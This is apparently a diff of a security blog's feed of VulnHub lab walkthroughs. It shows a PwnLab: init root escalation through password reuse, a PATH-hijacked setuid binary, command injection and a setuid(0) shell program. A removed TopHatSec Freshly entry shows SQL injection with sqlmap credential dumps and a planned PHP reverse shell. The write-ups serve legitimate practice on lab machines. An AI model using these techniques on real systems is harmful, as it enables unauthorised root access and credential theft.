+</span><span class='line'>          RX bytes:11602121 <span class="o">(</span>11.0 MiB<span class="o">)</span>  TX bytes:8154028 <span class="o">(</span>7.7 MiB<span class="o">)</span>
+</span><span class='line'>          Interrupt:19 Base address:0x2000
+</span><span class='line'>
+</span><span class='line'>lo        Link encap:Local Loopback
+</span><span class='line'>          inet addr:127.0.0.1  Mask:255.0.0.0
+</span><span class='line'>          inet6 addr: ::1/128 Scope:Host
+</span><span class='line'>          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+</span><span class='line'>          RX packets:2 errors:0 dropped:0 overruns:0 frame:0
+</span><span class='line'>          TX packets:2 errors:0 dropped:0 overruns:0 carrier:0
+</span><span class='line'>          collisions:0 txqueuelen:0
+</span><span class='line'>          RX bytes:100 <span class="o">(</span>100.0 B<span class="o">)</span>  TX bytes:100 <span class="o">(</span>100.0 B<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">$ </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>During the enumeration phase, I tried the user creditionals collected from the previouse steps:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>www-data@pwnlab:/tmp<span class="nv">$ </span>su mike
+</span><span class='line'>su mike
+</span><span class='line'>Password: SIfdsTEn6I
+</span><span class='line'>
+</span><span class='line'>su: Authentication failure
+</span><span class='line'>www-data@pwnlab:/tmp<span class="nv">$ </span>su kent
+</span><span class='line'>su kent
+</span><span class='line'>Password: JWzXuBJJNy
+</span><span class='line'>
+</span><span class='line'>kent@pwnlab:/tmp<span class="nv">$ </span>id
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>kent<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>kent<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>kent<span class="o">)</span>
+</span><span class='line'>kent@pwnlab:/tmp<span class="nv">$ </span><span class="nb">cd</span> /home/kent
+</span><span class='line'><span class="nb">cd</span> /home/kent
+</span><span class='line'>kent@pwnlab:~<span class="nv">$ </span>ls -la
+</span><span class='line'>ls -la
+</span><span class='line'>total 20
+</span><span class='line'>drwxr-x--- <span class="m">2</span> kent kent <span class="m">4096</span> Mar <span class="m">17</span> 10:06 .
+</span><span class='line'>drwxr-xr-x <span class="m">6</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 10:09 ..
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> kent kent  <span class="m">220</span> Mar <span class="m">17</span> 10:06 .bash_logout
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> kent kent <span class="m">3515</span> Mar <span class="m">17</span> 10:06 .bashrc
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> kent kent  <span class="m">675</span> Mar <span class="m">17</span> 10:06 .profile
+</span><span class='line'>kent@pwnlab:~<span class="nv">$ </span>sudo -l
+</span><span class='line'>sudo -l
+</span><span class='line'>bash: sudo: <span class="nb">command </span>not found
+</span><span class='line'>
+</span><span class='line'>kent@pwnlab:/<span class="nv">$ </span>su kane
+</span><span class='line'>su kane
+</span><span class='line'>Password: iSv5Ym2GRo
+</span><span class='line'>
+</span><span class='line'>kane@pwnlab:/<span class="nv">$ </span>id
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>kane<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>kane<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1003<span class="o">(</span>kane<span class="o">)</span>
+</span><span class='line'>kane@pwnlab:/<span class="nv">$ </span><span class="nb">cd</span> /home/kane
+</span><span class='line'><span class="nb">cd</span> /home/kane
+</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span>ls -la
+</span><span class='line'>ls -la
+</span><span class='line'>total 28
+</span><span class='line'>drwxr-x--- <span class="m">2</span> kane kane <span class="m">4096</span> Mar <span class="m">17</span> 13:04 .
+</span><span class='line'>drwxr-xr-x <span class="m">6</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 10:09 ..
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> kane kane  <span class="m">220</span> Mar <span class="m">17</span> 10:09 .bash_logout
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> kane kane <span class="m">3515</span> Mar <span class="m">17</span> 10:09 .bashrc
+</span><span class='line'>-rwsr-sr-x <span class="m">1</span> mike mike <span class="m">5148</span> Mar <span class="m">17</span> 13:04 msgmike
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> kane kane  <span class="m">675</span> Mar <span class="m">17</span> 10:09 .profile
+</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Both <code>kent</code> and <code>kane</code> can be logged in successfully, but there is interesting file under kane&rsquo;s home directory, <code>msgmike</code> which the <code>setuid</code> bit is set.</p>
+
+<p>By running <code>msgmike</code>, I found it will call system commaned <code>cat</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>kane@pwnlab:~<span class="nv">$ </span>./msgmike
+</span><span class='line'>./msgmike
+</span><span class='line'>cat: /home/mike/msg.txt: No such file or directory
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In order to escape to <code>mike</code>, I create a executable file <code>cat</code> under the local directory and set the environmental variable <code>PATH</code> to include <code>.</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'> 
+</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span>
+</span><span class='line'><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span>
+</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
+</span><span class='line'><span class="nb">echo</span> <span class="nv">$PATH</span>
+</span><span class='line'>.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">&quot;/bin/bash&quot;</span> &gt; cat
+</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;/bin/bash&quot;</span> &gt; cat
+</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span>chmod +x cat
+</span><span class='line'>chmod +x cat
+</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span>ls -la
+</span><span class='line'>ls -la
+</span><span class='line'>total 32
+</span><span class='line'>drwxr-x--- <span class="m">2</span> kane kane <span class="m">4096</span> Aug <span class="m">24</span> 08:49 .
+</span><span class='line'>drwxr-xr-x <span class="m">6</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 10:09 ..
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> kane kane  <span class="m">220</span> Mar <span class="m">17</span> 10:09 .bash_logout
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> kane kane <span class="m">3515</span> Mar <span class="m">17</span> 10:09 .bashrc
+</span><span class='line'>-rwxrwxrwx <span class="m">1</span> kane kane   <span class="m">10</span> Aug <span class="m">24</span> 08:49 cat
+</span><span class='line'>-rwsr-sr-x <span class="m">1</span> mike mike <span class="m">5148</span> Mar <span class="m">17</span> 13:04 msgmike
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> kane kane  <span class="m">675</span> Mar <span class="m">17</span> 10:09 .profile
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then run the <code>./msgmike</code> to escape to user <code>mike</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>kane@pwnlab:~<span class="nv">$ </span>./msgmike
+</span><span class='line'>./msgmike
+</span><span class='line'>mike@pwnlab:~<span class="nv">$ </span>id
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span>,1003<span class="o">(</span>kane<span class="o">)</span>
+</span><span class='line'>mike@pwnlab:~<span class="nv">$ </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After promoted to <code>mike</code>, I found another <code>setuid</code> bit set file <code>msg2root</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>ls -la
+</span><span class='line'>ls -la
+</span><span class='line'>total 28
+</span><span class='line'>drwxr-x--- <span class="m">2</span> mike mike <span class="m">4096</span> Mar <span class="m">17</span> 15:19 .
+</span><span class='line'>drwxr-xr-x <span class="m">6</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 10:09 ..
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> mike mike  <span class="m">220</span> Mar <span class="m">17</span> 10:08 .bash_logout
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> mike mike <span class="m">3515</span> Mar <span class="m">17</span> 10:08 .bashrc
+</span><span class='line'>-rwsr-sr-x <span class="m">1</span> root root <span class="m">5364</span> Mar <span class="m">17</span> 13:07 msg2root
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> mike mike  <span class="m">675</span> Mar <span class="m">17</span> 10:08 .profile
+</span><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>
+</span><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>./msg2root
+</span><span class='line'>./msg2root
+</span><span class='line'>Message <span class="k">for</span> root: <span class="nb">test</span><span class="p">;</span> id
+</span><span class='line'><span class="nb">test</span><span class="p">;</span> id
+</span><span class='line'><span class="nb">test</span>
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1003<span class="o">(</span>kane<span class="o">)</span>
+</span><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Also I noticed that command injection vulnerability exists.</p>
+
+<p>Then I upload <code>setuid.c</code> file to target server and compile it.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/var/www/html/privesc# cat setuid.c
+</span><span class='line'><span class="c">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="c">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="c">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="c">#include &lt;unistd.h&gt;</span>
+</span><span class='line'>int main<span class="o">()</span>
+</span><span class='line'><span class="o">{</span>
+</span><span class='line'> setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+</span><span class='line'> system<span class="o">(</span> <span class="s2">&quot;/bin/sh -i&quot;</span> <span class="o">)</span><span class="p">;</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After compiled <code>setuid.c</code> and run it as injected command to get ROOT.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>gcc -o setuid setuid.c
+</span><span class='line'>gcc -o setuid setuid.c
+</span><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>ls
+</span><span class='line'>ls
+</span><span class='line'>boot2root  msg2root  setuid  setuid.c
+</span><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>./msg2root
+</span><span class='line'>./msg2root
+</span><span class='line'>Message <span class="k">for</span> root: id<span class="p">;</span> ./setuid
+</span><span class='line'>id<span class="p">;</span> ./setuid
+</span><span class='line'>id
+</span><span class='line'><span class="c"># id</span>
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1003<span class="o">(</span>kane<span class="o">)</span>
+</span><span class='line'><span class="c"># </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Cool, got ROOT!!</p>
+
+<p>Time to get FLAG!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># cd /root</span>
+</span><span class='line'><span class="nb">cd</span> /root
+</span><span class='line'><span class="c"># ls -al</span>
+</span><span class='line'>ls -al
+</span><span class='line'>total 20
+</span><span class='line'>drwx------  <span class="m">2</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 15:17 .
+</span><span class='line'>drwxr-xr-x <span class="m">21</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 09:13 ..
+</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Mar <span class="m">17</span> 10:06 .bash_history -&gt; /dev/null
+</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root  <span class="m">570</span> Jan <span class="m">31</span>  <span class="m">2010</span> .bashrc
+</span><span class='line'>----------  <span class="m">1</span> root root <span class="m">1840</span> Mar <span class="m">17</span> 15:17 flag.txt
+</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Mar <span class="m">17</span> 13:10 messages.txt -&gt; /dev/null
+</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Mar <span class="m">17</span> 13:10 .mysql_history -&gt; /dev/null
+</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root  <span class="m">140</span> Nov <span class="m">19</span>  <span class="m">2007</span> .profile
+</span><span class='line'><span class="c"># cat flag.txt</span>
+</span><span class='line'>cat flag.txt
+</span><span class='line'>.-<span class="o">=</span>~<span class="o">=</span>-.                                                                 .-<span class="o">=</span>~<span class="o">=</span>-.
+</span><span class='line'><span class="o">(</span>__  _<span class="o">)</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">(</span>__  _<span class="o">)</span>
+</span><span class='line'><span class="o">(</span>_ ___<span class="o">)</span>  _____                             _                            <span class="o">(</span>_ ___<span class="o">)</span>
+</span><span class='line'><span class="o">(</span>__  _<span class="o">)</span> /  __ <span class="se">\ </span>                          <span class="p">|</span> <span class="p">|</span>                           <span class="o">(</span>__  _<span class="o">)</span>
+</span><span class='line'><span class="o">(</span> _ __<span class="o">)</span> <span class="p">|</span> /  <span class="se">\/</span> ___  _ __   __ _ _ __ __ _<span class="p">|</span> <span class="p">|</span>_ ___                      <span class="o">(</span> _ __<span class="o">)</span>
+</span><span class='line'><span class="o">(</span>__  _<span class="o">)</span> <span class="p">|</span> <span class="p">|</span>    / _ <span class="se">\|</span> <span class="s1">&#39;_ \ / _` | &#39;</span>__/ _<span class="sb">`</span> <span class="p">|</span> __/ __<span class="p">|</span>                     <span class="o">(</span>__  _<span class="o">)</span>
+</span><span class='line'><span class="o">(</span>_ ___<span class="o">)</span> <span class="p">|</span> <span class="se">\_</span>_/<span class="se">\ </span><span class="o">(</span>_<span class="o">)</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span>_<span class="se">\_</span>_ <span class="se">\ </span>                    <span class="o">(</span>_ ___<span class="o">)</span>
+</span><span class='line'><span class="o">(</span>__  _<span class="o">)</span>  <span class="se">\_</span>___/<span class="se">\_</span>__/<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>_, <span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>_<span class="p">|</span>___/                     <span class="o">(</span>__  _<span class="o">)</span>
+</span><span class='line'><span class="o">(</span> _ __<span class="o">)</span>                     __/ <span class="p">|</span>                                       <span class="o">(</span> _ __<span class="o">)</span>
+</span><span class='line'><span class="o">(</span>__  _<span class="o">)</span>                    <span class="p">|</span>___/                                        <span class="o">(</span>__  _<span class="o">)</span>
+</span><span class='line'><span class="o">(</span>__  _<span class="o">)</span>                                                                 <span class="o">(</span>__  _<span class="o">)</span>
+</span><span class='line'><span class="o">(</span>_ ___<span class="o">)</span> If  you are  reading this,  means  that you have  <span class="nb">break</span> <span class="s1">&#39;init&#39;</span>  <span class="o">(</span>_ ___<span class="o">)</span>
+</span><span class='line'><span class="o">(</span> _ __<span class="o">)</span> Pwnlab.  I hope  you enjoyed  and thanks  <span class="k">for</span>  your <span class="nb">time </span>doing  <span class="o">(</span> _ __<span class="o">)</span>
+</span><span class='line'><span class="o">(</span>__  _<span class="o">)</span> this challenge.                                                 <span class="o">(</span>__  _<span class="o">)</span>
+</span><span class='line'><span class="o">(</span>_ ___<span class="o">)</span>                                                                 <span class="o">(</span>_ ___<span class="o">)</span>
+</span><span class='line'><span class="o">(</span> _ __<span class="o">)</span> Please send me  your  feedback or your  writeup,  I will  love  <span class="o">(</span> _ __<span class="o">)</span>
+</span><span class='line'><span class="o">(</span>__  _<span class="o">)</span> reading it                                                      <span class="o">(</span>__  _<span class="o">)</span>
+</span><span class='line'><span class="o">(</span>__  _<span class="o">)</span>                                                                 <span class="o">(</span>__  _<span class="o">)</span>
+</span><span class='line'><span class="o">(</span>__  _<span class="o">)</span>                                             For sniferl4bs.com  <span class="o">(</span>__  _<span class="o">)</span>
+</span><span class='line'><span class="o">(</span> _ __<span class="o">)</span>                                claor@PwnLab.net - @Chronicoder  <span class="o">(</span> _ __<span class="o">)</span>
+</span><span class='line'><span class="o">(</span>__  _<span class="o">)</span>                                                                 <span class="o">(</span>__  _<span class="o">)</span>
+</span><span class='line'><span class="o">(</span>_ ___<span class="o">)</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">(</span>_ ___<span class="o">)</span>
+</span><span class='line'><span class="sb">`</span>-._.-<span class="s1">&#39;                                                                 `-._.-&#39;</span>
+</span><span class='line'><span class="c"># </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<!--- Reference -->
+
+
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[[VulnHub] Stapler: 1]]></title>
@@ -29,7 +1231,7 @@
 
 <p>Attacker: Kali2 Linux (<em>10.1.1.132/24</em>)</p>
 
-<p>Target: Mr-Robot: 1 (<em>10.1.1.138/24</em>)</p>
+<p>Target: Stapler: 1 (<em>10.1.1.138/24</em>)</p>
 
 <h2>Vulnerability &amp; Exploit</h2>
 
@@ -214,7 +1416,7 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>Based on the result of NMAP scan, firstly, I found FTP port 21 is open Anonymous login allowed. So I connected to the FTP server and found a file <code>note</code>:</p>
+<p>Based on the result of NMAP scan, firstly, I found FTP port 21 is open and Anonymous login allowed. So I connected to the FTP server and found a file <code>note</code>:</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -15052,175 +16254,6 @@ Also, gotta thank barrebas who was able to find a way to make things easier&hell
 <p><img class="left" src="http://f4l13n5n0w.github.io/downloads/knock-knock/14.png"></p>
 
 <p>Done :)</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[[Vulnhub]TopHatSec: Freshly]]></title>
-    <link href="http://f4l13n5n0w.github.io/blog/2015/06/13/vulnhub-tophatsec-freshly/"/>
-    <updated>2015-06-13T18:57:26+10:00</updated>
-    <id>http://f4l13n5n0w.github.io/blog/2015/06/13/vulnhub-tophatsec-freshly</id>
-    <content type="html"><![CDATA[<p>&ldquo;The goal of this challenge is to break into the machine via the web and find the secret hidden in a sensitive file. If you can find the secret, send me an email for verification. :)
-There are a couple of different ways that you can go with this one. Good luck!&rdquo; &ndash; <a href="http://www.top-hat-sec.com/">TopHatSec</a></p>
-
-<p>&ldquo;VulnHub note: You may have issues when importing to VMware. If this is the case. extract the HDD from the OVA file (using something like 7zip), and attach to a new VM. Please see the following guide: <a href="https://jkad.github.io/blog/2015/04/12/how-to-import-the-top-hat-sec-vms-into-vmware/.">https://jkad.github.io/blog/2015/04/12/how-to-import-the-top-hat-sec-vms-into-vmware/.</a>&rdquo; &ndash; <a href="https://www.vulnhub.com/">VulnHub</a></p>
-
-<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/tophatsec-freshly,118/">here</a>.</p>
-
-<!-- more -->
-
-
-<h2>Links</h2>
-
-<p>watch video online:</p>
-
-<iframe src='http://player.vimeo.com/video/130604105?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>
-
-
-<h2>Attacker &amp; Target</h2>
-
-<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>
-
-<p>Target: TopHatSec: Freshly (<em>10.10.10.134/24</em>)</p>
-
-<h2>Vulnerability &amp; Exploit</h2>
-
-<ul>
-<li>login.php - SQL Injection Vulnerability</li>
-<li>weak/same passwords used</li>
-<li>/etc/shadow file world readable</li>
-</ul>
-
-
-<h2>Method</h2>
-
-<ul>
-<li>Scanned the network to discover the target server [Net Discover]</li>
-<li>Port scanned the target to discover the running services and open ports [nmap]</li>
-<li>Web information gathering and interacting with the web server [firefox]</li>
-<li>Web application scanned to dig more information about web service [nikto]</li>
-<li>Exploit SQL injection vulnerability and dump wordpress admin password [sqlmap]</li>
-<li>Upload PHP reverse shell and read /etc/passwd and /etc/shadow to greb sensitive information</li>
-<li>Use john the ripper for brute-force cracking to get root&rsquo;s password</li>
-<li>Generate and upload Linux meterpreter reverse shell and login as root with cracked password</li>
-</ul>
-
-
-<h2>Tools</h2>
-
-<p>All the tools used here can be found in Kali Linux</p>
-
-<ul>
-<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
-<li><a href="https://nmap.org/">nmap</a></li>
-<li><a href="https://cirt.net/Nikto2">nikto</a></li>
-<li><a href="http://sqlmap.org/">sqlmap</a></li>
-<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
-<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
-</ul>
-
-
-<h2>Walkthrough</h2>
-
-<p>Using netdiscover as routine to detect the target&rsquo;s IP address and then run NMAP scan to detect opening ports/running services on the target. From the result, TCP port 80, 443 and 8080 have been discovered and the web server is apache 2.4.7 running on Ubuntu Linux.</p>
-
-<p>Due to only web services are found, I decided to use <em>nikto</em> firstly to dig more information on port 80 and got the following result:</p>
-
-<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/freshly/1.png"></p>
-
-<p>An login page has been found by <em>nikto</em> and I access <code>http://10.10.10.134/login.php</code> on firefox, it shows a login form with username and password input box.</p>
-
-<p>Simply try some weak passwords such as <code>admin/admin</code> and get <code>0</code> responded which means login failed.</p>
-
-<p>Then I tested simple SQL injection statements such as <code>' or 1=1 -- -</code> in username box and anything in password box, this time the server response <code>1</code> which means login successful.</p>
-
-<p>Based on the test result, I know here is SQL injection vulnerability.</p>
-
-<p>Now fire up <em>SQLMAP</em> to exploit it automatically.</p>
-
-<p><code>sqlmap --url "http://10.10.10.134/login.php" --data "user=1*&amp;password=1&amp;s=Submit" --dbs</code></p>
-
-<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/freshly/2.png"></p>
-
-<p><code>sqlmap --url "http://10.10.10.134/login.php" --data "user=1*&amp;password=1&amp;s=Submit" --smart --batch --dump -T users -D wordpress8080</code></p>
-
-<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/freshly/3.png"></p>
-
-<p>Here we are, the wordpress admin credential has been dumped:</p>
-
